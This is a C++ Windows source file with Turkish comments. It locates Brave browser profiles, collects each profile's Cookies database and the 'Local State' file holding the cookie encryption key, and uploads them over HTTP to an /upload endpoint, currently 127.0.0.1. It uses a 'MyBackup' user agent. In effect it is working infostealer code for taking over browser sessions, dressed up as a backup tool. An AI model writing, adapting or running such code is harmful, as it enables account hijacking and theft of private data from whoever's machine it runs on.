#include <windows.h>
#include <shlobj.h>
#include <winhttp.h>

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

namespace fs = std::filesystem;

// Sunucuya dosya gönderen yardımcı fonksiyon
bool UploadFile(HINTERNET connection, const fs::path& filePath, const std::string& fileNameHeader)
{
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
    {
        return false;
    }

    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    if (size <= 0)
    {
        file.close();
        return false;
    }

    std::vector<char> data(static_cast<size_t>(size));
    if (!file.read(data.data(), size))
    {
        file.close();
        return false;
    }
    file.close();

    HINTERNET request = WinHttpOpenRequest(
        connection,
        L"POST",
        L"/upload",
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!request)
    {
        return false;
    }

    // Sunucunun dosya adını ayırt edebilmesi için X-File-Name header'ı ekliyoruz
    std::wstring wHeader = L"Content-Type: application/octet-stream\r\nX-File-Name: " + 
                           std::wstring(fileNameHeader.begin(), fileNameHeader.end()) + L"\r\n";

    BOOL result = WinHttpSendRequest(
        request,
        wHeader.c_str(),
        static_cast<DWORD>(-1),
        data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    );

    bool success = false;
    if (result && WinHttpReceiveResponse(request, nullptr))
    {
        success = true;
    }

    WinHttpCloseHandle(request);
    return success;
}

// Dosyanın varlığını/erişilebilirliğini kontrol edip işleyen fonksiyon
void ProcessFile(HINTERNET connection, const fs::path& filePath, const std::string& profileName, const std::string& fileType)
{
    // Dosya var mı ve okunabiliyor mu kontrol et
    if (fs::exists(filePath) && fs::is_regular_file(filePath))
    {
        std::string serverFileName = profileName + "_" + fileType;
        if (UploadFile(connection, filePath, serverFileName))
        {
            std::cout << profileName << " " << fileType << " yuklendi.\n";
        }
        else
        {
            std::cout << profileName << " " << fileType << " erisilemedi.\n";
        }
    }
    else
    {
        std::cout << profileName << " " << fileType << " erisilemedi.\n";
    }
}

int main()
{
    // LocalAppData yolunu al
    PWSTR localAppData = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);

    if (FAILED(hr))
    {
        std::cerr << "LocalAppData yolu alinamadi.\n";
        return 1;
    }

    fs::path userDataPath = fs::path(localAppData) / L"BraveSoftware" / L"Brave-Browser" / L"User Data";
    CoTaskMemFree(localAppData);

    if (!fs::exists(userDataPath))
    {
        std::cerr << "Brave User Data klasoru bulunamadi.\n";
        return 1;
    }

    // WinHTTP Oturumu Başlat
    HINTERNET session = WinHttpOpen(
        L"MyBackup/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session)
    {
        std::cerr << "WinHttpOpen basarisiz.\n";
        return 1;
    }

    // Sunucuya Bağlan
    HINTERNET connection = WinHttpConnect(
        session,
        L"127.0.0.1",
        INTERNET_DEFAULT_HTTP_PORT,
        0
    );

    if (!connection)
    {
        std::cerr << "WinHttpConnect basarisiz.\n";
        WinHttpCloseHandle(session);
        return 1;
    }

    // 1. Kök dizindeki Local State dosyasını yükle (User Data\Local State)
    ProcessFile(connection, userDataPath / "Local State", "User Data", "Local State");

    // 2. User Data klasörünü tara ve profilleri bul
    for (const auto& entry : fs::directory_iterator(userDataPath))
    {
        if (entry.is_directory())
        {
            std::string dirName = entry.path().filename().string();

            // Sadece Default veya "Profile " ile başlayan klasörleri hedefle
            if (dirName == "Default" || dirName.find("Profile") == 0)
            {
                // Cookies yolu (Network/Cookies veya doğrudan Cookies)
                fs::path cookiesPath = entry.path() / "Network" / "Cookies";
                if (!fs::exists(cookiesPath))
                {
                    cookiesPath = entry.path() / "Cookies";
                }
                ProcessFile(connection, cookiesPath, dirName, "Cookies");

                // Profil içi Local State (varsa)
                fs::path profileLocalState = entry.path() / "Local State";
                ProcessFile(connection, profileLocalState, dirName, "Local State");
            }
        }
    }

    // Bağlantıları Kapat
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    return 0;
}
